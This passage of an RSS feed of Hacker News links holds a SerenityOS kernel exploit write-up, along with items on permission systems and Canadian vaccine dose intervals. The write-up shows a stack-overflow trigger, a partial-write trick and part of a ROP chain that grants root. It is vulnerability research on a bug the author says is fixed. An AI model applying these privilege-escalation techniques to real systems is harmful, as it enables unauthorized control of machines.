<figure><a href="https://oneedge.io/" target="_blank" rel="noopener"><img src="https://opennebula.io/wp-content/uploads/2021/03/ONEedge_logo_small.png" alt="ONEedge logo small" width="69" height="43" title="CNCF Webinar - K3s at the Edge for Multiplayer Gaming 2" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2069%2043'%3E%3C/svg%3E" data-lazy-src="https://opennebula.io/wp-content/uploads/2021/03/ONEedge_logo_small.png"></a></figure>
</div>



<p>This work has received funding from the European Union’s Horizon 2020 research and innovation program under grant agreement <strong>ONEedge</strong> 880412  🇪🇺</p>
</div>

			</div></div>]]>
            </description>
            <link>https://opennebula.io/cncf-webinar-kubernetes-at-the-edge/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26361258</guid>
            <pubDate>Fri, 05 Mar 2021 19:53:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SerenityOS Kernel Hacking Adventures: Memory corruption to root privileges]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26361085">thread link</a>) | @ingve
<br/>
March 5, 2021 | https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/ | <a href="https://web.archive.org/web/*/https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Memory corruption to root privileges.</p><div>
        <p><img src="https://styles.redditmedia.com/t5_11p1s4/styles/communityIcon_82qz1x1k5uj41.png" alt="SerenityOS Logo"></p>

<p>Recently I have taken an interest in a project called SerenityOS. Stolen straight from the <a href="https://github.com/SerenityOS/serenity">GitHub</a>:</p>
<blockquote>
<p>SerenityOS is a love letter to ’90s user interfaces with a custom Unix-like core. It flatters with sincerity by stealing beautiful ideas from various other systems.</p>
<p>Roughly speaking, the goal is a marriage between the aesthetic of late-1990s productivity software and the power-user accessibility of late-2000s *nix. This is a system by us, for us, based on the things we like.</p>
</blockquote>
<p>It’s a surprisingly featured hobby operating system with quite a welcoming community behind it. It caught my radar after a series of videos by LiveOverflow and Andreas (the developer) detailing a few exploits made during the <a href="https://hxp.io/blog/79/hxp-CTF-2020-wisdom2/">2020 hxp CTF</a>, so I decided to explore the system myself. Eventually, I found a memory corruption bug in some networking code that could be leveraged into kernel-mode code execution.</p>

<p>The vulnerability can be hit so easily by some bad code that I’m surprised it wasn’t found by a fuzzer immediately. At its core, it’s a stack overflow in the function <code>TCPSocket::send_tcp_packet</code>. To see how, let’s take a look at the implementation.</p>
<div><pre><code data-lang="cpp">KResult TCPSocket<span>::</span>send_tcp_packet(u16 flags, <span>const</span> UserOrKernelBuffer<span>*</span> payload, size_t payload_size)
{
    <span>const</span> size_t buffer_size <span>=</span> <span>sizeof</span>(TCPPacket) <span>+</span> payload_size;
    <span>alignas</span>(TCPPacket) u8 buffer[buffer_size];
    <span>new</span> (buffer) TCPPacket;
    <span>auto</span><span>&amp;</span> tcp_packet <span>=</span> <span>*</span>(TCPPacket<span>*</span>)(buffer);
    ASSERT(local_port());
    tcp_packet.set_source_port(local_port());
    tcp_packet.set_destination_port(peer_port());
    tcp_packet.set_window_size(<span>1024</span>);
    tcp_packet.set_sequence_number(m_sequence_number);
    tcp_packet.set_data_offset(<span>sizeof</span>(TCPPacket) <span>/</span> <span>sizeof</span>(u32));
    tcp_packet.set_flags(flags);
    <span>//...
</span><span></span>    <span>if</span> (payload <span>&amp;&amp;</span> <span>!</span>payload<span>-&gt;</span>read(tcp_packet.payload(), payload_size))
        <span>return</span> EFAULT;
    <span>//...
</span><span></span>    <span>if</span> (tcp_packet.has_syn() <span>||</span> payload_size <span>&gt;</span> <span>0</span>) {
        <span>//...
</span><span></span>        send_outgoing_packets();
        <span>return</span> KSuccess;
    }
    <span>//...
</span><span></span>}
</code></pre></div><p>This function is called when attempting to use the <code>send()</code> syscall on a TCP socket (naturally). None of the parent callers in the chain (<code>Process::sys$sendmsg</code>, <code>IPv4Socket::sendto</code>, and <code>TCPSocket::protocol_send</code>) do any bounds checking on the user-provided <code>payload_size</code> other than ensuring the value is in userspace. Unfortunately, a value being in userspace is quite a lax requirement when then using the value to make a stack allocation. The problem line is:</p>
<div><pre><code data-lang="cpp"><span>alignas</span>(TCPPacket) u8 buffer[buffer_size];
</code></pre></div><p><code>buffer</code> is then a Variable-length Array (<a href="https://en.wikipedia.org/wiki/Variable-length_array">VLA</a>) which is a really cursed feature from C99 that is as bad as it sounds. It attempts to dynamically resize the stack-frame using the value we provided, which can do some very unexpected things when the value is larger than the stack size (Serenity seems to use a stack size of 2^16 in the kernel). We can thus easily obliterate the stack and trigger a crash by calling something to the effect of:</p>
<div><pre><code data-lang="cpp">send(tcp_socket, user_buffer, <span>0xdeadaa</span>, <span>0</span>); <span>//BOOM!
</span></code></pre></div><p>This is all well and good, but can we actually do something useful with this? First and foremost, we need to make sure there’s no funny business going on with the allocation itself. Examining the code produced by gcc:</p>
<div><pre><code data-lang="r"><span>...</span>
<span>&lt;</span><span>+749</span><span>&gt;:</span> test   eax,eax
<span>&lt;</span><span>+751</span><span>&gt;:</span> jg     <span>0xc018a36f</span> <span>&lt;</span>Kernel<span>::</span>TCPSocket<span>::</span><span>send_tcp_packet</span>(unsigned short, Kernel<span>::</span>UserOrKernelBuffer const<span>*</span>, unsigned long)<span>+771</span><span>&gt;</span>
<span>&lt;</span><span>+753</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+754</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+755</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+756</span><span>&gt;:</span> lea    eax,[ebx<span>+0</span>x1c3be4]
<span>&lt;</span><span>+762</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+763</span><span>&gt;:</span> call   <span>0xc01e08e2</span> <span>&lt;</span><span>__ubsan_handle_vla_bound_not_positive</span>()<span>&gt;</span>
<span>&lt;</span><span>+768</span><span>&gt;:</span> add    esp,<span>0x10</span>
<span>&lt;</span><span>+771</span><span>&gt;:</span> mov    eax,DWORD PTR [ebp<span>-0</span>x70]
<span>&lt;</span><span>+774</span><span>&gt;:</span> lea    esi,[ebp<span>-0</span>x58]
<span>&lt;</span><span>+777</span><span>&gt;:</span> add    eax,<span>0xf</span>
<span>&lt;</span><span>+780</span><span>&gt;:</span> and    eax,<span>0xfffffff0</span>
<span>&lt;</span><span>+783</span><span>&gt;:</span> sub    esp,eax
<span>&lt;</span><span>+785</span><span>&gt;:</span> lea    eax,[ebp<span>-0</span>x70]
<span>...</span>
</code></pre></div><p>Seems to do exactly as advertised, just a <code>sub esp</code> with our value (and with the shiny UB sanitizer attached). So now that we can be confident the allocation won’t mess with any memory, the next step is using it safely. Nearly right after the allocation, we have our userspace buffer being copied into the kernel buffer:</p>
<div><pre><code data-lang="cpp"><span>if</span> (payload <span>&amp;&amp;</span> <span>!</span>payload<span>-&gt;</span>read(tcp_packet.payload(), payload_size))
    <span>return</span> EFAULT;
</code></pre></div><p>This could be bad news for us <em>if</em> we provide a valid-sized user buffer because then we’d at the very least hit the guard page below the stack and fail. But that’s a big <em>if</em>. Providing a non-valid user buffer is totally fair game, too. How would the kernel know? What I mean by this is that our buffer isn’t as long as we say it is. The result is that as <code>payload-&gt;read</code> attempts to copy over our bytes, it’ll fault when it hits our bad memory. But this time, the fault will be on the <em>user side</em>, meaning the function will gracefully exit on the kernel’s end.</p>
<div><pre><code data-lang="cpp">u8<span>*</span> stack_smash <span>=</span> (u8<span>*</span>)mmap(<span>nullptr</span>, ST_BUFFER_LEN, PROT_READ <span>|</span> PROT_WRITE, MAP_SHARED <span>|</span> MAP_ANONYMOUS, <span>-</span><span>1</span>, <span>0</span>);
...
send(socket_fd, stack_smash, send_len, <span>0</span>); <span>//send_len is much, much larger than ST_BUFFER_LEN!
</span></code></pre></div><p><a href="https://twitter.com/patrickwardle">@patrickwardle</a> has a nice visual of this regarding a similar idea on macOS:</p>
<p><img src="https://pbs.twimg.com/media/EvYgh2MVIAYT_8I?format=jpg&amp;name=large" alt="macOS partial write"></p>
<p>This is wonderful, as this chain of events means we have:</p>
<ul>
<li>A <code>sub esp</code> with a user-controlled value</li>
<li>An arbitrary write with another user-controlled value/length</li>
<li>A graceful exit</li>
</ul>
<p>I reported the <a href="https://github.com/SerenityOS/serenity/issues/5310">issue</a> and it was fixed within 15 minutes. This guy is a beast!</p>
<p>Now we have all the tools necessary to exploit this :)</p>

<p>We have essentially what is an arbitrary write primitive, so first we must choose what we want to write to. We have to keep in mind that we are writing from an offset from the stack, though, which might make things a little unpredictable. Thankfully, there is little to no KASLR on the system (as far as I’ve seen) but general system noise and randomness make specific writes fairly difficult. That makes directly writing to a critical structure out of the question, but what about staying in the realm of the stack? As the bug is a stack overflow we can’t write to anything already on our stack (as it continues to grow downwards), but I did notice the offsets between stacks seems to remain constant:</p>
<div><pre><code data-lang="cs">...
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc35df000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc35f0000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc3601000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc3612000
...
</code></pre></div><p>The offset is 0x11000, which is just the stack size 0x10000 plus the guard page size 0x1000. And so, if we can’t write to our own stack… we can still write to another process stack fairly reliably. It then just becomes a case of winning a race condition between what the other process is doing and the write that we do. This is not a problem however as we control the ‘victim’ process, so we can just make it do something as trivial as call sleep, giving us an arbitrary race window. There is also one final annoyance of some randomization that is done whenever we call a syscall:</p>
<div><pre><code data-lang="cpp"><span>// Apply a random offset in the range 0-255 to the stack pointer,
</span><span>// to make kernel stacks a bit less deterministic.
</span><span>// Since this is very hot code, request random data in chunks instead of
</span><span>// one byte at a time. This is a noticeable speedup.
</span><span></span><span>if</span> (g_random_byte_buffer_offset <span>==</span> RandomByteBufferSize) {
    get_fast_random_bytes(g_random_byte_buffer, RandomByteBufferSize);
    g_random_byte_buffer_offset <span>=</span> <span>0</span>;
}
</code></pre></div><p>This slight randomization to the stack bases makes writing to an exact address of the victim’s stack unreliable (granted, it could be brute-forced in a millisecond). But once again the stars align as the sleep syscall does not care very much about how the stack is laid out as it returns. During its call, it eventually reaches the function <code>Processor::switch_context</code>, which is the final stage before swapping contexts. In it, it does:</p>
<div><pre><code data-lang="r"><span>...</span>
<span>&lt;</span><span>+159</span><span>&gt;:</span> pushf  
<span>&lt;</span><span>+160</span><span>&gt;:</span> push   ebx
<span>&lt;</span><span>+161</span><span>&gt;:</span> push   esi
<span>&lt;</span><span>+162</span><span>&gt;:</span> push   edi
<span>&lt;</span><span>+163</span><span>&gt;:</span> push   ebp
<span>...</span>
<span>&lt;</span><span>+186</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+187</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+188</span><span>&gt;:</span> push   ecx
<span>&lt;</span><span>+189</span><span>&gt;:</span> cld    
<span>&lt;</span><span>+190</span><span>&gt;:</span> jmp    <span>0xc011b7d4</span> <span>&lt;</span><span>enter_thread_context</span>()<span>&gt;</span>
<span>&lt;</span><span>+195</span><span>&gt;:</span> pop    edx
<span>&lt;</span><span>+196</span><span>&gt;:</span> pop    eax
<span>&lt;</span><span>+197</span><span>&gt;:</span> pop    ebp
<span>&lt;</span><span>+198</span><span>&gt;:</span> pop    edi
<span>&lt;</span><span>+199</span><span>&gt;:</span> pop    esi
<span>&lt;</span><span>+200</span><span>&gt;:</span> pop    ebx
<span>&lt;</span><span>+201</span><span>&gt;:</span> popf   
<span>...</span>
<span>&lt;</span><span>+225</span><span>&gt;:</span> lea    esp,[ebp<span>-0</span>xc]
<span>&lt;</span><span>+228</span><span>&gt;:</span> pop    ebx
<span>&lt;</span><span>+229</span><span>&gt;:</span> pop    esi
<span>&lt;</span><span>+230</span><span>&gt;:</span> pop    edi
<span>&lt;</span><span>+231</span><span>&gt;:</span> pop    ebp
<span>&lt;</span><span>+232</span><span>&gt;:</span> ret    
<span>...</span>
</code></pre></div><p>Pretty much saving the state and restoring it afterwards. Crucially, it loads <code>esp</code> with a value on the stack, then returns shortly after. Accuracy doesn’t matter here, we can just spray the stack with a new stack pointer and have it return from there… code execution! At this point, we just need to put a ROP chain in some kernel memory and have the stack be redirected to there. I chose to just spray some heap memory with the ROP, but this part was extremely iffy. The offset between the current stack and the heap is not something I could reasonably predict so I had to pretty much blast the entire heap with the code. I used something like a nop sled but with a bunch of rets instead (a ret sled?) to make the ROP chain execution reliable but it would still crash half the time if the offset was too large and I wrote to some bad memory. There’s probably a better way to store the ROP but for my purposes, it will suffice.</p>
<p>The ROP chain I ended up with was very similar to the one in vakzz’s awesome <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">exploit chain</a>, writing root to our processes permission bits.</p>
<div><pre><code data-lang="cpp">write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0157c1e</span>); <span>//pop eax; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0811000</span>); <span>//heap
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc011ccdc</span>); <span>//pop edx; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc02289ef</span>); <span>//Kernell::process::current()
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc019092e</span>); <span>//mov dw [eax], edx; ret;
</span><span></span>
pad(heap_smash, <span>&amp;</span>off, <span>0x41414141</span>);       <span>//stack padding
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0157cec</span>); <span>//pop edi; pop ebp; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0811018</span>); <span>//heap+0x18 
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0x00000000</span>); <span>//dummy 
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0195672</span>); <span>//call dw [edi - 0x18]; ret;
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc011ccdc</span>); <span>//pop edx; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0x00000038</span>); <span>//uid offset
</span><span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/">https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/</a></em></p>]]>
            </description>
            <link>https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26361085</guid>
            <pubDate>Fri, 05 Mar 2021 19:36:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Identity Is Not the Foundation of Permission Systems]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26360811">thread link</a>) | @jzelinskie
<br/>
March 5, 2021 | https://authzed.com/blog/identity-isnt-the-foundation/ | <a href="https://web.archive.org/web/*/https://authzed.com/blog/identity-isnt-the-foundation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Have you ever chatted with a fellow developer about an application’s permission system and quickly realized you’re also talking about its login system?
It’s rather unfortunate, but these two entirely distinct systems often get merged together simply because their formal names start with the same four letters: <strong>AUTH</strong>.</p><blockquote><p>Authentication (“authN” or “identity”) is who you are</p><p>Authorization (“authZ” or “permissions” or “access control”) is what you’re allowed to do</p></blockquote><p>This is no amateur mistake.
Even <a href="https://docs.djangoproject.com/en/3.1/ref/contrib/auth/">major web frameworks</a> bundle these concepts together out of convenience.</p><p>Because so many applications need to support users from inception, identity becomes vital for developers to understand on day one.
However, building a robust permission system can usually be deferred until users start demanding it.
When requests for fine grained access control inevitably start pouring in, they often come alongside feature requests for integrations with various <a href="https://en.wikipedia.org/wiki/Identity_provider">Identity Providers</a>.
This makes it seem natural to assume that the permission systems should be direct integrations with the primitives that the Identity Providers expose.
However, the <em>authorization</em> functionality that is often found in most <em>authentication</em> systems is generally overly simplistic and the resulting permission systems that are built on top are usually fragile and error prone.</p><p>This is the last thing you want to hear when discussing software that determines whether or not a user has access to sensitive content.
If you’re thinking “that’s only if you work in a domain, like healthcare or government, where you know sophisticated access control is required”, you should consider that even in simple use cases you’ll likely be iterating on your design, which gives you ample opportunities to introduce bugs that manifest themselves as security vulnerabilities.</p><h2 id="ldap-flips-conways-law-on-its-head">LDAP flips Conway’s Law on its head</h2><blockquote><p>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.</p><p>— Melvin E. Conway</p></blockquote><p>Conway’s Law describes how the architecture of software is a reflection of the organization of the people that built it.
For example, software components that are decoupled, but belong to the same application are often separate only because they were built by separate teams.</p><p>When permission systems are based on Identity Providers, this law is entirely reversed.</p><p>If an organization of people cannot use any software because everything, for example, only supports a structure that can be modeled by <a href="https://ldapwiki.com/wiki/Groups%20Are%20Bad">LDAP Groups</a>, it forces the people to reorganize into something that can be modeled by LDAP Groups.</p><p>This may be viable for organizations like businesses (the reorgs will continue until morale improves!), but obviously not all software can demand that their users reorganize just to use their product.</p><h2 id="groups-scopes-claims-dont-answer-the-question">Groups, Scopes, Claims don’t answer the question</h2><p>LDAP Groups, OAuth Scopes, SAML Claims, JWT Claims: all a rose by any other name.
These concepts all represent the same kind of data: an <em><a href="https://docs.authzed.com/authz/abac">attribute</a></em> that is stored on a user, indicating something about that user.
Attributes are useful: they can provide context about a user (such as an object they can access, or a role that the user has), which makes such a system, in theory, a reasonable solution to determining what a user can access.
However, in practice, developers realize that this isn’t quite so obvious once they have started working with this data.</p><p>Software that relies on these concepts for permissions all struggle in the same core principle: how they choose to interpret and apply significance to the presence of an attribute:</p><ul><li>If a user has both the “admin” and the “banned” attribute, what is the correct action?</li><li>Should admins be able to ignore bans or was the employee just fired from the company?</li><li>What about attributes that imply other attributes?</li><li>Does being “admin” also imply “write” access to this resource?</li></ul><p>You can see how this quickly gets out of hand.
And once it’s been decided how attributes should be properly interpreted, it’s time to audit every other application and make sure they interpret the attribute the exact same way or else you might have a security problem!</p><p>Now, there is nothing fundamentally wrong with attribute-based permission systems.
In fact, mature permission systems are almost always a fusion of ideas from <a href="https://docs.authzed.com/authz/what-else">various models</a> based on the requirements at hand.
In this case, how the attributes from <em>authentication</em> systems manifest themselves when they become the foundation of a permission system is the problem.
This is because attributes can only state facts about an identity.
But what we really need is the answer to the question “can this subject take this action on this resource?”.</p><h2 id="permissions-are-about-your-relationships">Permissions are about your relationships</h2><p>While identity is required to ask the question “Does this <code>subject</code> have permission to do this <code>action</code> to this <code>object</code>?”, it is not the <em>only</em> variable.
Identity sits alongside the <em>action</em> and the <em>object</em>.
That’s all well and good, but how <em>should</em> one arrive at the answer to one of these questions?</p><p>A great place to start is to crack open a social network like Facebook.
Go review (and probably update) your privacy settings; you’ll find a variety of configurations for sharing your content like friends-only or friends-of-friends.
When you change that setting, you’ll find that it applies instantaneously; there is no migration happening in their backend where thousands of users are granted the attribute to view your content.
This is because Facebook is designed to store and query <em>relationships</em> between their users.
Facebook is powered by a social <em>graph</em>.</p><p>If we lean on the idea of modeling relationships, like Facebook does, you can change the question from “Does X have permission to do Y to Z?” into “Does X have the relationship Y with Z?”.
For example, “Does User #123 have the Write relationship with Document #456?”.
Recall the example from reading attributes where the application has to decide if the “admin” attribute also implies the “write” attribute.
In a relationship-based model, this problem disappears because these are just more relationships:</p><figure><img src="https://authzed.com/images/blogs/identity-isnt-the-foundation/admin.png" alt="A graph displaying a path from a document to a user by passing through a write relationship and then an admin relationship."><figcaption><em>Users with the Admin relationship transitively have the Write relationship</em></figcaption></figure><p>The beauty of a relationship-based system is that the application doesn’t care <em>how</em> the user got to the Write relationship.
Maybe they’re the user that created the document.
Maybe the user had some kind of admin relationship that gives them the ability to do everything.
It doesn’t matter as long as there is some path through our relationship graph from the user to the Write relationship on the document.</p><figure><img src="https://authzed.com/images/blogs/identity-isnt-the-foundation/who%20cares.png" alt="A graph displaying a path from a document to a user by passing through the write relationship and then many unknown and complex relationships."><figcaption><em>Who cares how the user has the Write relationship?</em></figcaption></figure><p>This means that relationships can change (like changing your privacy settings) and applications will not need to have their code rewritten because there was no longer anything left open to interpretation.</p><h2 id="restoring-conways-law">Restoring Conway’s Law</h2><p>By realizing that permissions systems are fundamentally coupled to the <em>relationships</em> between people and objects in our software, we can build systems that mimic the way people naturally organize their world to be most effective.
This not only empowers the people consuming the software, but leads developers to arrive at more robust permission systems that can withstand changes to the organization.</p><p>If you’re left wondering what a permission system based on relationships looks like in practice, <a href="https://authzed.com/">Authzed</a> is exactly that!
We’re currently working hands-on with customers to help them understand and migrate to a better permission system.
If adding or refactoring permissions to support new functionality in your app is next on your roadmap, <a href="https://authzed.com/inquire">reach out to us</a>.</p></div></div>]]>
            </description>
            <link>https://authzed.com/blog/identity-isnt-the-foundation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360811</guid>
            <pubDate>Fri, 05 Mar 2021 19:12:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SVG Tetris]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26360716">thread link</a>) | @marcodiego
<br/>
March 5, 2021 | https://www.xul.fr/svgtetris.svg | <a href="https://web.archive.org/web/*/https://www.xul.fr/svgtetris.svg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.xul.fr/svgtetris.svg</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360716</guid>
            <pubDate>Fri, 05 Mar 2021 19:07:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Canadian government switches to support for first doses first]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26360556">thread link</a>) | @monkeypizza
<br/>
March 5, 2021 | https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html | <a href="https://web.archive.org/web/*/https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


    
    <h2>On this page</h2>
<ul>
	<li><a href="#a1">Preamble</a></li>
	<li><a href="#a2">Summary</a></li>
	<li><a href="#a3">Introduction</a></li>
	<li><a href="#a4">Methods</a></li>
	<li><a href="#a5">Recommendations</a></li>
	<li><a href="#a6">Summary of rationale</a></li>
	<li><a href="#a7">Acknowledgments</a></li>
</ul>
<h2 id="a1">Preamble</h2>
<p>The National Advisory Committee on Immunization (NACI) is an External Advisory Body that provides the Public Health Agency of Canada (PHAC) with independent, ongoing and timely medical, scientific, and public health advice in response to questions from PHAC relating to immunization.</p>
<p>In addition to burden of disease and vaccine characteristics, PHAC has expanded the mandate of NACI to include the systematic consideration of programmatic factors in developing evidence-based recommendations to facilitate timely decision-making for publicly funded vaccine programs at provincial and territorial levels.</p>
<p>The additional factors to be systematically considered by NACI include: economics, ethics, equity, feasibility, and acceptability. Not all NACI Statements will require in-depth analyses of all programmatic factors. While systematic consideration of programmatic factors will be conducted using evidence-informed tools to identify distinct issues that could impact decision-making for recommendation development, only distinct issues identified as being specific to the vaccine or vaccine-preventable disease will be included.</p>
<p>This statement contains NACI's independent advice and recommendations, which are based upon the best current available scientific knowledge.</p>
<p>This document is being disseminated for information purposes. People administering the vaccine should also be aware of the contents of the relevant product monograph(s). Recommendations for use and other information set out herein may differ from that set out in the product monograph(s) of the Canadian manufacturer(s) of the vaccines. Manufacturer(s) have sought approval of the vaccines and provided evidence as to its safety and efficacy only when it is used in accordance with the product monographs. NACI members and liaison members conduct themselves within the context of PHAC's Policy on Conflict of Interest, including yearly declaration of potential conflict of interest.</p>
<h2 id="a2">Summary</h2>
<ul>
	<li>NACI has considered evidence from recent scientific studies on efficacy and effectiveness of COVID-19 vaccines in preventing various health outcomes such as infection, symptomatic disease, hospitalizations and death from COVID-19.</li>
	<li>While studies have not yet collected four months of data on vaccine effectiveness after the first dose, the first two months of real world effectiveness are showing sustained high levels of protection.</li>
	<li>Short term sustained protection is consistent with immunological principles and vaccine science where it is not expected to see rapid waning of a highly effective vaccine in adults over a relatively short period of time.&nbsp;Extending the interval between doses was shown to be a good strategy through modelling, even in scenarios considering a six month interval and in theoretical scenarios where waning protection was considered.</li>
	<li>NACI recommends that in the context of limited COVID-19 vaccine supply, jurisdictions should maximize the number of individuals benefiting from the first dose of vaccine by extending the interval for the second dose of vaccine to four months.</li>
	<li>Extending the dose interval to four months allows NACI to create opportunities for protection of the entire adult population within a short timeframe. This will not only achieve protection of the adult population, but will also contribute to health equity,</li>
	<li>NACI will continue to monitor the evidence on effectiveness of extended dose intervals and will adjust recommendations as needed.</li>
</ul>
<h2 id="a3">Introduction</h2>
<p>Since COVID-19 vaccines were first authorised in Canada in December 2020, the National Advisory Committee on Immunization (NACI) has been providing evidence-informed guidance on the recommended interval between vaccine doses. In the most recent update, January 12, 2021, NACI provided advice on extending intervals for mRNA vaccines to six weeks. In February 2021 the Public Health Agency of Canada (PHAC) asked NACI to address the following context and question: Due to limited vaccine supply and logistical challenges, jurisdictions need to implement COVID-19 mRNA vaccine intervals beyond six weeks. Given emerging evidence as mRNA vaccines are rolled out to populations in Canada and elsewhere in the world, what extended interval would be recommended in order to balance individual protection and population impact? Are extended intervals a particular concern for any key populations?</p>
<h3 id="a3.1">Guidance objective</h3>
<p>The objective of this bulletin is to provide guidance for the equitable, ethical, and efficient allocation of authorized COVID-19 vaccines in the context of staggered arrival of vaccine supply. This guidance builds on the foundational framework of NACI's <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/recommendations-use-covid-19-vaccines.html">Recommendations on the use of COVID-19 vaccines</a>. The goal of Canada's pandemic response is to minimize serious illness and death while minimizing societal disruption as a result of the COVID-19 pandemic.</p>
<h2 id="a4">Methods</h2>
<p>NACI reviewed available evidence in full Committee meetings (February 8, 2021; February 24-25, 2021) and Working Group meetings (February 19, 2021) on extended intervals for COVID-19 vaccines. This included evidence available from published peer-review studies, pre-prints, and data available from population-based assessments from within and outside of Canada. On March 1, 2021, NACI voted on and approved the revised recommendations by majority. Due to the urgency for provinces and territories to consider implementing extended dose intervals, NACI is providing an abridged rationale in this document. The complete analysis, including more detailed evidence summaries and references, will be provided in coming weeks as the NACI evergreen guideline is updated online in the <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/recommendations-use-covid-19-vaccines.html">Recommendations on the use of COVID-19 vaccines</a>.</p>
<h2 id="a5">Recommendations</h2>
<p>Based on emerging evidence of the protection provided by the first dose of a two dose series for COVID-19 vaccines currently authorized in Canada, NACI recommends that in the context of limited COVID-19 vaccine supply jurisdictions should maximize the number of individuals benefiting from the first dose of vaccine by extending the second dose of COVID-19 vaccine up to four months after the first. NACI will continue to monitor the evidence on effectiveness of an extended dose interval and will adjust recommendations as needed. <strong>(Strong NACI Recommendation)</strong></p>
<ul>
	<li>In addition to emerging population-based data, this recommendation is based on expert opinion and the public health principles of equity, ethics, accessibility, feasibility, immunological vaccine principles, and the perspective that, within a global pandemic setting, reducing the risk of severe disease outcomes at the population-level will have the greatest impact. Current evidence suggests high vaccine effectiveness against symptomatic disease and hospitalization for several weeks after the first dose, including among older populations.</li>
	<li>This recommendation applies to all COVID-19 vaccines currently authorized for use in Canada.</li>
	<li>In situations where informed consent included assumptions about second dose timing, jurisdictions may consider offering second doses at shorter intervals for those who provided consent for the vaccine series prior to this recommendation.</li>
	<li>The vaccine effectiveness of the first dose will be monitored closely and the decision to delay the second dose will be continuously assessed based on surveillance and effectiveness data and post-implementation study designs. Effectiveness against variants of concern will also be monitored closely, and recommendations may need to be revised.</li>
</ul>
<p>Please note:</p>
<ul>
	<li>A&nbsp;<strong>strong recommendation</strong>&nbsp;applies to most populations/individuals and should be followed unless a clear and compelling rationale for an alternative approach is present.</li>
	<li>A&nbsp;<strong>discretionary recommendation</strong>&nbsp;may be offered for some populations/individuals in some circumstances. Alternative approaches may be reasonable.</li>
</ul>
<h2 id="a6">Summary of rationale</h2>
<p>Due to the urgency for provinces and territories to consider implementing extended dose intervals, NACI is providing an abridged rationale in this document. The complete analysis, including more detailed evidence summaries and references, will be provided in coming weeks as the NACI evergreen guideline is updated online in the <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/recommendations-use-covid-19-vaccines.html">Recommendations on the use of COVID-19 vaccines</a>.</p>
<h3 id="a6.1">Protecting individuals</h3>
<ul>
	<li>By implementing an extended four month interval strategy, Canada will be able to provide access to first doses of highly efficacious vaccines to more individuals earlier which is expected to increase health equity faster. Canada has secured enough vaccines to ensure that a second dose will be available to every adult.</li>
	<li>As a general vaccination principle, interruption of a vaccine series resulting in an extended interval between doses does not require restarting the vaccine series. Principles of immunology, vaccine science, and historical examples demonstrate that delays between doses do not result in a reduction in final antibody concentrations nor a reduction in durability of memory response for most multi-dose products.</li>
